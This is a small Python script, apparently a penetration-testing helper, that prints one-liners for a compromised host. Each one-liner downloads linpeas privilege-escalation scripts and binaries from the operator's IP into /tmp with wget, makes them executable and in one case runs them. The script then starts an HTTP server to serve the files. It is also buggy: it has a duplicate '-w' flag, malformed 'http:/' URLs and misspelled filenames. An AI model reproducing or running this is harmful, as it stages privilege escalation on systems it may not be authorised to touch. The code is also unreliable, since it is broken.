import subprocess
import argparse

parser = argparse.ArgumentParser(description="Python server file unloading")
parser.add_argument("-w", "--wget", dest='sub_wget', help="downloads program",default="wget", required=True)
parser.add_argument("-w", "--curl", dest='sub_curl', help="downloads program", required=True)
parser.add_argument("-ip", "--ip", dest='sub_ip', help="ip addres",default="127.0.0.1", required=True)
parser.add_argument("-p", "--port", dest='sub_port', help="port", required=True)
options = parser.parse_args()

port = options.sub_port
ip = options.sub_ip
wget = options.sub_wget
curl = options.sub_curl

print(f"Start PSFU - Python Server File Unloading")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas.sh && chmod +x linpeas.sh && ./linpes.sh")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_darwin_amd64 && chmod +x linpeas_darwin_amd64")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_darwin_arm64 && chmod +x linpeas_darwin_arm64")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_fat.sh && chmod +x linpeas_fat.sh")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_linux_386 && chmod +x linpeas_linux_386")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_linux_amd64 && chmod +x linpeas_linux_amd64")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_linux_arm && chmod +x linpeas_linux_arm")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_linux_arm64 && chmod +x linpeas_linux_arm64")
print(f"--------------------------------------------------")
print (f"cd /tmp && wget http:/{ip}:{port}/linux/linpeas_small.sh && chmod +x lnpeas_small.sh")
print(f"--------------------------------------------------")

subprocess.run(f"python3 -m http.server {port}")

